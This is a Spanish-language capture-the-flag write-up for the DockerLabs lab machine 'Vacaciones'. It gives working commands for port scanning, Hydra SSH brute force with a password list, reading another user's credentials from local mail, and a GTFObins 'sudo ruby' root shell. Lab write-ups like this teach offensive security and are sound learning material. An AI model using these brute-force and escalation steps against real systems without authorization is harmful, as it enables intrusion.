# 🏖️ Vacaciones - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Fácil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/Técnicas-Hydra%20%7C%20GTFObins-orange)

## 📌 Resumen

Máquina de nivel **Fácil** de [DockerLabs](https://dockerlabs.es/) que explota:

- Un comentario en el código fuente HTML para descubrir usuarios.
- Fuerza bruta SSH con Hydra.
- Lectura de correo local como pivot entre usuarios.
- Mala configuración de `sudo` con Ruby para escalar a root.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | 22, 80 |
| Enumeración | Ctrl+U en web | juan, camilo |
| Explotación | `hydra` SSH | camilo:password1 |
| Pivot | `/var/mail/camilo/correo.txt` | juan:2k84dicb |
| Escalada | `sudo ruby` | **root** |

> **Nota:** Esta máquina no incluye archivo de flag. El objetivo es demostrar
> acceso como `root`, evidenciado con `whoami`.

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22     | SSH      | OpenSSH (Ubuntu) |
| 80     | HTTP     | Apache httpd |

---

## 🔎 Enumeración

### Web

La página principal aparece en blanco, pero al revisar el **código fuente** (Ctrl+U) se encuentra un comentario:

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

💡 **Hallazgo:** dos posibles usuarios → `juan` y `camilo`.

---

## 💥 Explotación

### 1. Fuerza bruta SSH

Se crea una lista de usuarios:

```bash
cat > users.txt << 'EOF'
juan
camilo
EOF
```

Y una lista corta de contraseñas candidatas (más eficiente que `rockyou.txt` completo):

```bash
cat > pass.txt << 'EOF'
password1
password
camilo
juan
123456
12345678
admin
redbull
vacaciones
EOF
```

Ataque con Hydra:

```bash
hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 4
```

**Credenciales obtenidas:**

```
camilo:password1
```

### 2. Acceso SSH

```bash
ssh camilo@172.17.0.2
# password: password1
```

> ⚠️ Si aparece `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`, limpiar la huella vieja:
> ```bash
> ssh-keygen -R 172.17.0.2
> ```

### 3. Lectura del correo (pivot a juan)

Dentro del sistema se revisa el correo de camilo:

```bash
cat /var/mail/camilo/correo.txt
```

**Contenido:**

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

---

## 🚀 Escalada de privilegios

### 1. Cambio de usuario

```bash
su juan
# password: 2k84dicb
```

### 2. Enumeración de sudo

```bash
sudo -l
```

**Salida:**

```
User juan may run the following commands on cff7fd69f415:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Juan puede ejecutar **Ruby** como root sin contraseña.

### 3. Exploit con GTFObins

Consultando [GTFObins - ruby](https://gtfobins.github.io/gtfobins/ruby/):

```bash
sudo ruby -e 'exec "/bin/sh"'
```

Comprobación:

```bash
whoami
# root
```

---

## 📸 Evidencia

![root](https://github.com/user-attachments/assets/1505c901-4289-42c6-a50e-3a9c37e5c549)

✅ **Máquina comprometida completamente.**

---

## 🧠 Lecciones aprendidas

1. **No todo se encuentra con `ffuf`/`gobuster`.** Los comentarios en el HTML y el JS suelen esconder pistas.
2. **Listas cortas y pensadas > `rockyou.txt` completo.** En labs, probar candidatos obvios ahorra horas.
3. **El correo interno es un pivot clásico** en CTFs y en entornos reales (revisar `/var/mail/`).
4. **`sudo -l` es lo primero** que se ejecuta tras obtener shell.
5. **GTFObins es imprescindible** cuando hay binarios con `sudo NOPASSWD`.
6. **Leer los errores con calma.** Un typo como `exex` en vez de `exec` cuesta minutos.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `hydra`
- `curl`
- SSH
- GTFObins

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [GTFObins - ruby](https://gtfobins.github.io/gtfobins/ruby/)
- [HackTricks](https://book.hacktricks.xyz/)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-25


